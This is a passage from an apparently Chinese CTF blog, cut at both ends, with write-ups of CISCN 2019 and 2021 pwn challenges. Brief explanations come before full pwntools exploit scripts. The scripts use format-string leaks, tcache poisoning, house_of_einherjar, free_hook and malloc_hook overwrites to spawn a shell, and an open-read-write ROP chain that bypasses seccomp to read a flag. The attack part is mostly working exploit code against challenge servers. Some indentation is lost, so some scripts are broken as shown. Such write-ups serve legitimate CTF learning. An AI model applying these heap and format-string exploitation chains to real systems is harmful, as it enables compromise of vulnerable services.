ck_chk_fail_的got表作为堆地址，但是实际传入给puts函数的地址是__stack_chk_fail_got-0x10，所以泄露出来的是对应的puts函数的真实地址。\n\n之后就正常利用0x20,0x30,0x40的tcache来任意申请修改了。\n\n2.ciscn_2019_en_3：水题，利用格式化字符串泄露地址，打free_hook，唯一需要注意的一点是程序本身的提示信息，注意空格和DEBUG的使用。\n\n```python\n# -*- coding:UTF-8 -*-\nfrom pwn import *\nfrom LibcSearcher import *\n#context.log_level = 'debug'\n\n#context\ncontext.arch = 'amd64'\nSigreturnFrame(kernel = 'amd64')\n\n\nbinary = \"./ciscn_2019_en_3\"\n#libc_file = \"./libc-2.24.so\"\n#libc_file = \"/lib/x86_64-linux-gnu/libc-2.27.so\"\n#libc_file = \"\"\n\n#libcsearcher use\n#32bit:malloc_hook = main_arena-0x18\n#32bit:main_arena+56(unsortedbin_addr)\n#64bit:main_arena+96(unsortedbin_addr)//88 aslo have\n'''\nmalloc_hook = main_arena-0x10\nobj = LibcSearcher(\"__malloc_hook\", malloc_hook)\nobj = LibcSearcher(\"fgets\", 0Xd90)\nlibc_base = fgets-obj.dump('fgets')\nsystem_addr = libc_base + obj.dump(\"system\") #system\nbinsh_addr = libc_base + obj.dump(\"str_bin_sh\")\nlog.info(\"system_addr:0x%x\"%system_addr)\n'''\n\n#malloc_hook,main_aren Find\n'''\npython2 LibcOffset.py libc-2.23.so\n'''\n\n#without stripped\n'''\nputs_got = elf.got['puts']\nputs_plt = elf.plt['puts']\nsystem_plt = elf.plt['system']\nread_plt = elf.plt['read']\nmain_addr = elf.sym['main']\nfree_hook = libc_base + libc.sym['__free_hook']\nsystem_addr = libc_base + libc.sym['system']\nbinsh_addr = libc_base + libc.search('/bin/sh').next()\n'''\n\n\n#usually gadget:\n'''\nu_gadget1 = elf.sym['__libc_csu_init'] + 0x5a\nu_gadget2 = elf.sym['__libc_csu_init'] + 0x40\npop_rdi_ret = elf.sym['__libc_csu_init'] + 0x63\nret = elf.sym['__libc_csu_init'] + 0x64\n'''\n\n\nlocal = 0\nif local:\n    #p = process(binary)\n    p = process(binary, env={\"LD_PRELOAD\":\"./libc.so.6\"})\n    elf = ELF(binary)\n    #libc = ELF(libc_file)\nelse:\n    p = remote(\"node3.buuoj.cn\",\"25412\")\n    elf = ELF(binary)\n    #libc = ELF(libc_file)\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)\n\nmenu = \"Input your choice:\"\n\n\ndef add(size, con):\n    sla(menu, \"1\")\n    sla(\"Please input the size of story: \\n\", str(size))\n    sa(\"please inpute the story: \\n\", con)\n\ndef delete(idx):\n    sla(menu, \"4\")\n\nsla(\"Please input the index:\\n\", str(idx))\nsla(\"What's your name?\\n\",\"%p.%p\")\nru(\".0x\")\nread_addr = int(rc(12),16)-0x11\nobj = LibcSearcher(\"read\", read_addr)\nlibc_base = read_addr-obj.dump('read')\nsystem_addr = libc_base + obj.dump(\"system\") #system\nbinsh_addr = libc_base + obj.dump(\"str_bin_sh\")\nfree_hook = libc_base + obj.dump('__free_hook')\nlog.info(\"libc_base:0x%x\"%libc_base)\nlog.info(\"system_addr:0x%x\"%system_addr)\nsla(\"Please input your ID.\\n\",\"A\")\nadd(0x18,p64(free_hook))\nadd(0x18,\"/bin/sh\\x00\")\ndelete(0)\ndelete(0)\nadd(0x18,p64(free_hook))\nadd(0x18,p64(free_hook))\nadd(0x18,p64(system_addr))\ndelete(1)\np.interactive()\n```\n\n3.ciscn_2019_s_6：水到家的题，懒得看，两分钟改完脚本拉倒。\n\n```python\n# -*- coding:UTF-8 -*-\nfrom pwn import *\nfrom LibcSearcher import *\n#context.log_level = 'debug'\n\n#context\ncontext.arch = 'amd64'\nSigreturnFrame(kernel = 'amd64')\n\n\nbinary = \"./ciscn_s_6\"\n#libc_file = \"./libc-2.24.so\"\n#libc_file = \"/lib/x86_64-linux-gnu/libc-2.27.so\"\n#libc_file = \"\"\n\n#libcsearcher use\n#32bit:malloc_hook = main_arena-0x18\n#32bit:main_arena+56(unsortedbin_addr)\n#64bit:main_arena+96(unsortedbin_addr)//88 aslo have\n'''\nmalloc_hook = main_arena-0x10\nobj = LibcSearcher(\"__malloc_hook\", malloc_hook)\nobj = LibcSearcher(\"fgets\", 0Xd90)\nlibc_base = fgets-obj.dump('fgets')\nsystem_addr = libc_base + obj.dump(\"system\") #system\nbinsh_addr = libc_base + obj.dump(\"str_bin_sh\")\nlog.info(\"system_addr:0x%x\"%system_addr)\n'''\n\n#malloc_hook,main_aren Find\n'''\npython2 LibcOffset.py libc-2.23.so\n'''\n\n#without stripped\n'''\nputs_got = elf.got['puts']\nputs_plt = elf.plt['puts']\nsystem_plt = elf.plt['system']\nread_plt = elf.plt['read']\nmain_addr = elf.sym['main']\nfree_hook = libc_base + libc.sym['__free_hook']\nsystem_addr = libc_base + libc.sym['system']\nbinsh_addr = libc_base + libc.search('/bin/sh').next()\n'''\n\n\n#usually gadget:\n'''\nu_gadget1 = elf.sym['__libc_csu_init'] + 0x5a\nu_gadget2 = elf.sym['__libc_csu_init'] + 0x40\npop_rdi_ret = elf.sym['__libc_csu_init'] + 0x63\nret = elf.sym['__libc_csu_init'] + 0x64\n'''\n\n\nlocal = 0\nif local:\np = process(binary)\n#p = process(['/glibc/2.24/64/lib/ld-linux-x86-64.so.2', './hello'], env={\"LD_PRELOAD\":\"/glibc/2.24/64/lib/libc-2.24.so\"})\nelf = ELF(binary)\n#libc = ELF(libc_file)\nelse:\np = remote(\"node3.buuoj.cn\",\"25301\")\nelf = ELF(binary)\n#libc = ELF(libc_file)\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)\n\nmenu = \"choice:\"\n\n\ndef add(size,name,call):\n    p.recvuntil('choice:')\n    p.sendline('1')\n    p.recvuntil('name')\n    p.sendline(str(size))\n    p.recvuntil('name:')\n    p.sendline(name)\n    p.recvuntil('call:')\n    p.sendline(call)\n\ndef show(idx):\n    p.recvuntil('choice:')\n    p.sendline('2')\n    p.recvuntil('index:')\n    p.sendline(str(idx))\n\ndef delete(idx):\n    p.recvuntil('choice:')\n    p.sendline('3')\n    p.recvuntil('index:')\n    p.sendline(str(idx))\n\nadd(0x88,'pppp','pppp')\nadd(0x20,'pppp','pppp')\nadd(0x20,'pppp','pppp')\nfor i in range(7):\n    delete(0)\n\ndelete(0)\nshow(0)\np.recvuntil('name')\nmain_arena=u64(p.recvuntil('\\x7f')[-6:].ljust(8,'\\x00'))-96\nmalloc_hook = main_arena-0x10\nobj = LibcSearcher(\"__malloc_hook\", malloc_hook)\nlibc_base = malloc_hook-obj.dump('__malloc_hook')\nfree_hook = libc_base + obj.dump(\"__free_hook\")\nsystem_addr = libc_base + obj.dump(\"system\")\nlog.info(\"libc_base:0x%x\"%libc_base)\nlog.info(\"system_addr:0x%x\"%system_addr)\n\n#p.recvuntil()\ndelete(1)\ndelete(1)\ndelete(1)\n\nadd(0x20,p64(free_hook),'pppp')\nadd(0x20,'pppp','pppp')\nadd(0x20,p64(system_addr),'pppp')\nadd(0x20,'/bin/sh\\x00','pppp')\n\ndelete(6)\np.interactive()\n```\n\n4.ciscn_2019_sw_1：格式化字符串，改fini_array为main_addr，使得程序循环再来一次，劫持printf为system_plt，再输入binsh即可getshell。程序里的sys没啥用，用来迷惑人的，因为command无法被修改。\n\n```python\n# -*- coding:UTF-8 -*-\nfrom pwn import *\nfrom LibcSearcher import *\n\n#context.log_level = 'debug'\n\n#context\ncontext.arch = 'i386'\nSigreturnFrame(kernel = 'i386')\n\nbinary = \"./ciscn_2019_sw_1\"\n#libc_file = \"./libc-2.24.so\"\n#libc_file = \"\"\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)\n\n#libcsearcher use\n'''\nmalloc_hook = main_arena-0x10\nobj = LibcSearcher(\"__malloc_hook\", malloc_hook)\nobj = LibcSearcher(\"fgets\", 0Xd90)\nlibc_base = fgets-obj.dump('fgets')\nsystem_addr = libc_base + obj.dump(\"system\") #system\nbinsh_addr = libc_base + obj.dump(\"str_bin_sh\")\nlog.info(\"system_addr:0x%x\"%system_addr)\n'''\n\n#malloc_hook,main_aren Find\n'''\npython2 LibcOffset.py libc-2.23.so\n'''\n\n#without stripped\n'''\nputs_got = elf.got['puts']\nputs_plt = elf.plt['puts']\nsystem_plt = elf.plt['system']\nread_plt = elf.plt['read']\nmain_addr = elf.sym['main']\nsystem_addr = libc_base + libc.sym['system']\nbinsh_addr = libc_base + libc.search('/bin/sh').next()\n'''\n\n\n#usually gadget:\n'''\nu_gadget1 = elf.sym['__libc_csu_init'] + 0x5a\nu_gadget2 = elf.sym['__libc_csu_init'] + 0x40\npop_rdi_ret = elf.sym['__libc_csu_init'] + 0x63\nret = elf.sym['__libc_csu_init'] + 0x64\n'''\n\n\nlocal = 0\nif local:\n    p = process(binary)\n    #p = process(['/glibc/2.24/64/lib/ld-linux-x86-64.so.2', './hello'], env={\"LD_PRELOAD\":\"/glibc/2.24/64/lib/libc-2.24.so\"})\n    elf = ELF(binary)\n    #libc = ELF(libc_file)\nelse:\n    p = remote(\"node3.buuoj.cn\",\"27341\")\n    elf = ELF(binary)\n    #libc = ELF(libc_file)\n\nfini_array = 0x0804979C\nprintf_got = elf.got['printf']\nsystem_plt = elf.plt['system']\nmain_addr = elf.sym['main']\n\n\npayload = \"\"\npayload += p32(fini_array+2)\npayload += p32(fini_array)\npayload += p32(printf_got+2)\npayload += p32(printf_got)\npayload += '%'+str(0x0804-0x10)+'c'+'%4$hn'\npayload += '%'+str(int(main_addr&0xffff)-0x0804)+'c'+'%5$hn'\npayload += '%'+str(0x10804-int(main_addr&0xffff))+'c'+'%6$hn'\npayload += '%'+str(int(system_plt&0xffff)+0x10000-0x10804)+'c'+'%7$hn'\n\n\npause()\np.sendline(payload)\npause()\np.sendline(\"/bin/sh\\x00\")\npause()\np.interactive()\n```\n\n5.ciscn_2019_s_1：差点被这道题搞崩溃。网上解法太多，感觉都挺麻烦的。其实直接一个技巧就搞定：house_of_einherjar。进行一定堆布局，申请chunk8-chunk10，将0x100的tcache填满，在chunk8中伪造chunk，满足2.27下的unlink要求，即size位和fd,bk位。(由于这里给了堆地址，所以可以直接用，恰好能够满足要求)之后触发0x100的off-by-null向上合并，将chunk9给overlap，之后申请到tcache结构体，就能随便玩了。(house_of_einherjar重点在于2.27下的unlink)\n\n```python\n# -*- coding:UTF-8 -*-\nfrom pwn import *\nfrom LibcSearcher import *\n#context.log_level = 'debug'\n\n#context\ncontext.arch = 'amd64'\nSigreturnFrame(kernel = 'amd64')\n\n\nbinary = \"./ciscn_s_1\"\n#libc_file = \"./libc-2.24.so\"\n#libc_file = \"/lib/x86_64-linux-gnu/libc-2.27.so\"\n#libc_file = \"\"\n\n#libcsearcher use\n#32bit:malloc_hook = main_arena-0x18\n#32bit:main_arena+56(unsortedbin_addr)\n#64bit:main_arena+96(unsortedbin_addr)//88 aslo have\n'''\nmalloc_hook = main_arena-0x10\nobj = LibcSearcher(\"__malloc_hook\", malloc_hook)\nobj = LibcSearcher(\"fgets\", 0Xd90)\nlibc_base = fgets-obj.dump('fgets')\nsystem_addr = libc_base + obj.dump(\"system\") #system\nbinsh_addr = libc_base + obj.dump(\"str_bin_sh\")\nlog.info(\"system_addr:0x%x\"%system_addr)\n'''\n\n#malloc_hook,main_aren Find\n'''\npython2 LibcOffset.py libc-2.23.so\n'''\n\n#without stripped\n'''\nputs_got = elf.got['puts']\nputs_plt = elf.plt['puts']\nsystem_plt = elf.plt['system']\nread_plt = elf.plt['read']\nmain_addr = elf.sym['main']\nfree_hook = libc_base + libc.sym['__free_hook']\nsystem_addr = libc_base + libc.sym['system']\nbinsh_addr = libc_base + libc.search('/bin/sh').next()\n'''\n\n\n#usually gadget:\n'''\nu_gadget1 = elf.sym['__libc_csu_init'] + 0x5a\nu_gadget2 = elf.sym['__libc_csu_init'] + 0x40\npop_rdi_ret = elf.sym['__libc_csu_init'] + 0x63\nret = elf.sym['__libc_csu_init'] + 0x64\n'''\n\n\nlocal = 1\nif local:\np = process(binary)\n#p = process(binary, env={\"LD_PRELOAD\":\"./libc.so.6\"})\nelf = ELF(binary)\n#libc = ELF(libc_file)\nelse:\np = remote(\"node3.buuoj.cn\",\"26685\")\nelf = ELF(binary)\n#libc = ELF(libc_file)\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)\n\nmenu = \"4.show\\n\"\n\n\ndef add(idx,size, con):\n    sla(menu, \"1\")\n    sla(\"index:\\n\", str(idx))\n    sla(\"size:\\n\", str(size))\n    ru(\"gift: \")\n    chunk_addr = int(ru(\"\\n\"),16)\n    sa(\"content:\\n\", con)\n    return chunk_addr\n\ndef delete(idx):\n    sla(menu, \"2\")\n    sla(\"index:\\n\", str(idx))\n\ndef show(idx):\n    sla(menu, \"4\")\n    sla(\"index:\\n\", str(idx))\n\ndef edit(idx,con):\n    sla(menu, \"3\")\n    sla(\"index:\\n\", str(idx))\n    sa(\"content:\\n\", con)\n\nkey_addr = 0x6022B8\n\nchunk0_addr = add(0,0xf8,\"0\")\nheap_base = chunk0_addr-0x260\n\nchunk8_addr = add(8,0xf8,\"8\")\nchunk9_addr = add(9,0xe8,\"9\")\nchunk10_addr = add(10,0xf8,\"10\")\nlog.info(\"chunk8_addr:0x%x\"%chunk8_addr)\nlog.info(\"chunk9_addr:0x%x\"%chunk9_addr)\nlog.info(\"chunk10_addr:0x%x\"%chunk10_addr)\n\nedit(8,p64(0x110)+p64(0xf1+0xf0)+\np64(chunk8_addr)+p64(chunk8_addr))\nedit(9,\"9\"*0xe0+\np64(0xf0+0xf0))\n\nfor i in range(0,7):\n    add(i+1,0xf8,\"X\"*0xf7)\nfor i in range(0,7):\n    delete(i+1)\n\ndelete(9)\ndelete(10)\nchunkA_addr = add(9,0xd0,\"9\")\nchunkB_addr = add(10,0xd0,\np64(0x0)+p64(0xf0)+\np64(heap_base+0x10)+p64(heap_base+0x10))\nunsortedbin_addr = chunk8_addr+0x10+0xe0+0xe0\n\nadd(11,0xe8,p64(heap_base+0x10))\nadd(12,0xe8,\"\\x00\"*0x40+p64(0x0)*7+\np64(key_addr)+ #0x90\np64(0x0)+ #0xa0\np64(unsortedbin_addr-0x10)+ #0xb0\np64(heap_base+0x10)) #0xc0\n\nadd(13,0x88,p64(0x1))\nadd(14,0xa0,\"A\"*0x10)\nshow(14)\nru(\"AAAAAAAAAAAAAAAA\")\nmain_arena = u64(rc(6).ljust(8,\"\\x00\"))-96\n\nmalloc_hook = main_arena-0x10\nobj = LibcSearcher(\"__malloc_hook\", malloc_hook)\nlibc_base = malloc_hook-obj.dump('__malloc_hook')\nlog.info(\"libc_base:0x%x\"%libc_base)\nsystem_addr = libc_base + obj.dump(\"system\") #system\nfree_hook_addr = libc_base + obj.dump(\"__free_hook\")\nlog.info(\"free_hook_addr:0x%x\"%free_hook_addr)\nlog.info(\"system_addr:0x%x\"%system_addr)\n\nedit(12,\"\\x00\"*0x40+p64(0x0)*7+\np64(key_addr)+ #0x90\np64(free_hook_addr)+ #0xa0\np64(unsortedbin_addr-0x10)) #0xc0\n\nadd(15,0x98,p64(system_addr))\nadd(16,0xf0,\"/bin/sh\\x00\")\n\ndelete(16)\np.interactive()\n```\n\n \n","tags":["刷题"],"categories":["PWN"]},{"title":"CISCN2021线上复现","url":"/2021/08/14/CISCN2021线上复现/","content":"\n一.lonelywolf：UAF，show函数也可以泄露释放后的堆块。\n\n1.思路：\n\n(1)由于在edit的时候先是创建了一个新变量，然后依据size来从变量中获取数据拷贝到chunk中，所以最后补0其实没办法造成off by null。\n\n(2)申请0x8大小的堆块，释放后修改数据，连上放入tcache之后被赋值的bk，show一下，泄露出堆地址。\n\n(3)申请最大size的chunk，0x78，delete之后改掉fd指向heap_base，获得tcache结构体的控制权，0-0x40为大小，0x40-0x78为bin链，可控0x20,0x30,0x40,0x50,0x60,0x70,0x80的bin链。\n\n(4)之后就随意了，控bin链和bin大小，将任意一个bin大小的count改成7，伪造满tcache，之后释放一个chunk即可进入unsortedbin中，show一下得到Libc地址。\n\n(5)再控tcache结构体，直接得到malloc_hook的chunk，改为One_gadget，再申请一下chunk即可getshell。\n\n2.exp\n\n```\n#注释头\n\nfrom pwn import *\n#context.log_level = 'debug'\nlocal = 0\nif local:\np = process('./lonelywolf')\nelf = ELF(\"./lonelywolf\")\nlibc = ELF(\"/lib/x86_64-linux-gnu/libc-2.27.so\")\nelse:\np = remote(\"114.116.231.128\",\"25285\")\nlibc = ELF(\"./libc-2.27.so\")\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)\n\nmenu = \"Your choice: \"\n\n\ndef add(idx, size):\n    sla(menu, \"1\")\n    sla(\"Index: \",str(idx))\n    sla(\"Size: \",str(size))\n\n\ndef delete(idx):\n    sla(menu, \"4\")\n    sla(\"Index: \", str(idx))\n\ndef show(idx):\n    sla(menu, \"3\")\n    sla(\"Index: \", str(idx))\n\ndef edit(idx,con):\n    sla(menu, \"2\")\n    sla(\"Index: \", str(idx))\n    sla(\"Content: \", str(con))\n\n#leak heap\nadd(0,8)\nadd(0,8)\ndelete(0)\nedit(0,\"A\"*8)\nshow(0)\nru(\"AAAAAAAA\")\nheap = u64(p.recv(6)+\"\\x00\"+\"\\x00\")-0x10\n\n#control tcache struct,leak libc\nadd(0,0x78)\ndelete(0)\n#edit(0,p64(heap+0x2a0))\nedit(0,p64(heap+0x10))\nadd(0,0x78)\nadd(0,0x78)\nedit(0,\"\\x00\"*35+\"\\x07\")\ndelete(0)\nshow(0)\nru(\"Content: \")\nmalloc_hook = u64(p.recv(6)+\"\\x00\"+\"\\x00\")-112\nfree_hook = malloc_hook+7352\nlibc = malloc_hook-0x3EBC30\nsystem = libc+0x4F550\nprint(\"free_hook:\",hex(free_hook))\nprint(hex(malloc_hook))\n\n#change malloc_hook to one_gadget\none_gadget = libc+0x10a41c\nedit(0,\"\\x02\"+\"\\x00\"*0x3f+p64(heap+0x280)+\"\\x00\"*0x30)\nadd(0,0x8)\ndelete(0)\nedit(0,p64(malloc_hook))\nadd(0,0x8)\nadd(0,0x8)\nedit(0,p64(one_gadget))\nadd(0,0x8)\np.interactive()\n```\n\n \n\n二、silverwolf：(比赛的时候没接触过seccomp保护，在学长的指导下也算是做出来了。)和上面一样，只是加了沙箱保护，用seccomp-tools dump ./silverwolf查看一下：\n\n```\n#注释头\n\nroot@241adce81c0a:/ctf/CISCN/silverwolf# seccomp-tools dump ./silverwolf\nline CODE JT JF K\n=================================\n0000: 0x20 0x00 0x00 0x00000004 A = arch\n0001: 0x15 0x00 0x07 0xc000003e if (A != ARCH_X86_64) goto 0009\n0002: 0x20 0x00 0x00 0x00000000 A = sys_number\n0003: 0x35 0x00 0x01 0x40000000 if (A < 0x40000000) goto 0005\n0004: 0x15 0x00 0x04 0xffffffff if (A != 0xffffffff) goto 0009\n0005: 0x15 0x02 0x00 0x00000000 if (A == read) goto 0008\n0006: 0x15 0x01 0x00 0x00000001 if (A == write) goto 0008\n0007: 0x15 0x00 0x01 0x00000002 if (A != open) goto 0009\n0008: 0x06 0x00 0x00 0x7fff0000 return ALLOW\n0009: 0x06 0x00 0x00 0x00000000 return KILL\n```\n\n可以看到只剩read和write权限了，同时题目提示flag在./flag，所以用read和write来读取和打印flag即可，利用orw。\n\n1.思路：\n\n(1)一样的，控tcache结构体泄露heap和libc。\n\n(2)这里由于开seccomp保护会申请挺多堆块的，所以bins和heap中都比较乱，再加上限制size，所以这里可以有两种方法：\n\n①一是控tcache，从0x10-0x80都给控了，加起来总共0x240，这里算出来是0x148，足够放下orw了。\n\n②二是利用IO_FILE泄露environ，得到栈地址，再泄露得到ELF基地址，计算BSS段，将size给改了，那么edit想输入多少数据就能输入多少，这样就可以在一个chunk中放下所有orw。\n\n2.贴下exp:\n\n①控tcache：\n\n```\nfrom pwn import *\nimport os\nimport struct\nimport random\nimport time\nimport sys\nimport signal\n\n#context.log_level = 'debug'\ncontext.arch = 'amd64'\nSigreturnFrame(kernel = 'amd64')\n\nlocal = 1\nif local:\np = process('./silverwolf')\nelf = ELF(\"./silverwolf\")\nlibc = ELF(\"/lib/x86_64-linux-gnu/libc-2.27.so\")\nelse:\np = remote(\"114.116.231.128\",\"25285\")\nlibc = ELF(\"./libc-2.27.so\")\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)\n\nret = libc_base + 0x00000000000008aa # ret\npop_rdi_ret = libc_base + 0x00000000000215bf# pop rdi ; ret\npop_rsi_ret = libc_base + 0x0000000000023eea # pop rsi ; ret \npop_rdx_rsi_ret = libc_base + 0x0000000000130569 # pop rdx ; pop rsi ; ret\npop_rdx_ret = libc_base + 0x0000000000001b96 # pop rdx ; ret\nsyscall_ret = libc_base + 0x11B637\npop_rax_ret = libc_base + 0x0000000000043ae8\n\nmenu = \"Your choice: \"\n\n\ndef add(idx, size):\n    sla(menu, \"1\")\n    sla(\"Index: \",str(idx))\n    sla(\"Size: \",str(size))\n\n\ndef delete(idx):\n    sla(menu, \"4\")\n    sla(\"Index: \", str(idx))\n\ndef show(idx):\n    sla(menu, \"3\")\n    sla(\"Index: \", str(idx))\n\ndef edit(idx,con):\n    sla(menu, \"2\")\n    sla(\"Index: \", str(idx))\n    sla(\"Content: \", str(con))\n\n#leak heap\nadd(0,8)\nadd(0,8)\ndelete(0)\nedit(0,\"A\"*8)\nshow(0)\nru(\"AAAAAAAA\")\nheap = u64(p.recv(6)+\"\\x00\"+\"\\x00\")-0x10\nprint(\"heap:\",hex(heap))\n\n#control tcache struct,leak libc\nadd(0,0x78)\ndelete(0)\n#edit(0,p64(heap+0x2a0))\nedit(0,p64(heap+0x10))\nadd(0,0x78)\nadd(0,0x78)\nedit(0,\"\\x00\"*35+\"\\x07\")\ndelete(0)\nshow(0)\nru(\"Content: \")\nmalloc_hook = u64(p.recv(6)+\"\\x00\"+\"\\x00\")-112\nfree_hook = malloc_hook+7352\nlibc_base = malloc_hook-0x3EBC30\nsetcontext = libc_base+libc.sym['setcontext']\nsystem = libc_base+0x4F550\nIO_2_1_stdout_addr = libc_base + libc.symbols['_IO_2_1_stdout_']\nenviron = libc_base+libc.symbols['__environ']\nprint(\"IO_stdout:\",hex(IO_2_1_stdout_addr))\nprint(\"environ:\",hex(environ))\nprint(\"libc:\",hex(libc_base))\nprint(\"setcontext:\",hex(setcontext))\nprint(\"system:\",hex(system))\nprint(\"free_hook:\",hex(free_hook))\nprint(\"malloc_hook:\",hex(malloc_hook))\nprint(\"libsystem:\",hex(libc.sym[\"system\"]))\n\n#use IO_FILE,leak environ,elf_base,bss_addr,change size\nedit(0,\"\\x00\"+\"\\x00\"+\"\\x00\"+\"\\x00\"+\"\\x00\"+\"\\x02\"+\"\\x04\"+ \"\\x00\"*0x39+\np64(0x0)+ #0x20\np64(0x0)+ #0x30\np64(0x0)+ #0x40\np64(0x0)+ #0x50\np64(0x0)+ #0x60\np64(IO_2_1_stdout_addr)+ #0x70\np64(heap+0x10)) #0x80\nadd(0,0x68)\n#delete(0)\n#edit(0,p64(malloc_hook))\n#add(0,0x8)\n#add(0,0x8)\nedit(0,p64(0xFBAD1800)+p64(IO_2_1_stdout_addr+131)*0x3+p64(environ)+p64(environ+0x8))\nstack = u64(p.recv(6)+\"\\x00\"+\"\\x00\")\nprint(\"stack\",hex(stack))\nedit(0,p64(0xFBAD1800) +p64(IO_2_1_stdout_addr+131)*0x3+p64(stack+168)+p64(stack+168+8))\nelf = u64(p.recv(6)+\"\\x00\"+\"\\x00\")-0x40\nprint(\"elf\",hex(elf))\nbss = elf+0x202020\nsize_addr = bss+0x30\n\n#set free_hook to setcontext+53\nadd(0,0x78)\nedit(0,\"\\x01\"+\"\\x01\"+\"\\x00\"+\"\\x00\"+\"\\x01\"+\"\\x02\"+\"\\x04\"+ \"\\x00\"*0x39+\np64(free_hook)+ #0x20\np64(0x0)+ #0x30\np64(0x0)+ #0x40\np64(0x0)+ #0x50\np64(size_addr)+ #0x60\np64(0x0)+ #0x70\np64(heap+0x10)) #0x80\nadd(0,0x8)\nedit(0,p64(setcontext+53))\n\nadd(0,0x78)\nedit(0,\"\\x02\"+\"\\x01\"+\"\\x01\"+\"\\x01\"+\"\\x01\"+\"\\x02\"+\"\\x04\"+\"\\x02\" +\"\\x00\"*0x38+\np64(heap+0x2e0)+ #0x20\np64(heap+0x2e0+0x10)+ #0x30 \np64(heap+0x2e0+0x30)+ #0x40 \np64(heap+0x2e0+0x60)+ #0x50\np64(heap+0x2e0+0xa0)+ #0x60\np64(heap+0x2e0+0xf0)+ #0x70 \np64(heap+0x2e0)) #0x80\n\n\nfake_rsp = heap+0x2e0+0xb0+0x10\nflag = heap+0x2e0+0xb0\n\norw = \"a\"*0xa0 + p64(fake_rsp)+p64(ret)\norw += './flag\\x00\\x00'\norw += p64(0)\norw += p64(pop_rdi_ret) + p64(flag)\norw += p64(pop_rsi_ret) + p64(0)\norw += p64(pop_rax_ret) + p64(2)\norw += p64(syscall_ret)\norw += p64(pop_rdi_ret) + p64(3)\norw += p64(pop_rsi_ret) + p64(fake_rsp+0x200)\norw += p64(pop_rdx_ret) + p64(0x30)\norw += p64(libc_base+libc.sym['read'])\norw += p64(pop_rdi_ret) + p64(1)\norw += p64(libc_base+libc.sym['write'])\nprint(len(orw))\n\n#copy the orw to heap+0x2e0\nadd(0,0x10)\nedit(0,orw[0:0x10])\n\nadd(0,0x20)\nedit(0,orw[0x10:0x30])\n\nadd(0,0x30)\nedit(0,orw[0x30:0x60])\n\nadd(0,0x40)\nedit(0,orw[0x60:0xa0])\n\nadd(0,0x50)\nedit(0,orw[0xa0:0xf0])\n\nadd(0,0x60)\nedit(0,orw[0xf0:0x150])\n\nadd(0,0x78)\ndelete(0)\n\np.interactive()\n```\n\n \n\n②修改size：\n\n```\nfrom pwn import *\nimport os\nimport struct\nimport random\nimport time\nimport sys\nimport signal\n\n#context.log_level = 'debug'\ncontext.arch = 'amd64'\nSigreturnFrame(kernel = 'amd64')\n\nlocal = 1\nif local:\np = process('./silverwolf')\nelf = ELF(\"./silverwolf\")\nlibc = ELF(\"/lib/x86_64-linux-gnu/libc-2.27.so\")\nelse:\np = remote(\"114.116.231.128\",\"25285\")\nlibc = ELF(\"./libc-2.27.so\")\n\n\n#ROPgadget\nret = libc_base + 0x00000000000008aa # ret\npop_rdi_ret = libc_base + 0x00000000000215bf# pop rdi ; ret\npop_rsi_ret = libc_base + 0x0000000000023eea # pop rsi ; ret \npop_rdx_rsi_ret = libc_base + 0x0000000000130569 # pop rdx ; pop rsi ; ret\npop_rdx_ret = libc_base + 0x0000000000001b96 # pop rdx ; ret\nsyscall_ret = libc_base + 0x11B637\npop_rax_ret = libc_base + 0x0000000000043ae8\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)\n\nmenu = \"Your choice: \"\n\n\ndef add(idx, size):\n    sla(menu, \"1\")\n    sla(\"Index: \",str(idx))\n    sla(\"Size: \",str(size))\n\n\ndef delete(idx):\n    sla(menu, \"4\")\n    sla(\"Index: \", str(idx))\n\ndef show(idx):\n    sla(menu, \"3\")\n    sla(\"Index: \", str(idx))\n\ndef edit(idx,con):\n    sla(menu, \"2\")\n    sla(\"Index: \", str(idx))\n    sla(\"Content: \", str(con))\n\n#leak heap\nadd(0,8)\nadd(0,8)\ndelete(0)\nedit(0,\"A\"*8)\nshow(0)\nru(\"AAAAAAAA\")\nheap = u64(p.recv(6)+\"\\x00\"+\"\\x00\")-0x10\nprint(\"heap:\",hex(heap))\n\n#control tcache struct,leak libc\nadd(0,0x78)\ndelete(0)\n#edit(0,p64(heap+0x2a0))\nedit(0,p64(heap+0x10))\nadd(0,0x78)\nadd(0,0x78)\nedit(0,\"\\x00\"*35+\"\\x07\")\ndelete(0)\nshow(0)\nru(\"Content: \")\nmalloc_hook = u64(p.recv(6)+\"\\x00\"+\"\\x00\")-112\nfree_hook = malloc_hook+7352\nlibc_base = malloc_hook-0x3EBC30\nsetcontext = libc_base+libc.sym['setcontext']\nsystem = libc_base+0x4F550\nIO_2_1_stdout_addr = libc_base + libc.symbols['_IO_2_1_stdout_']\nenviron = 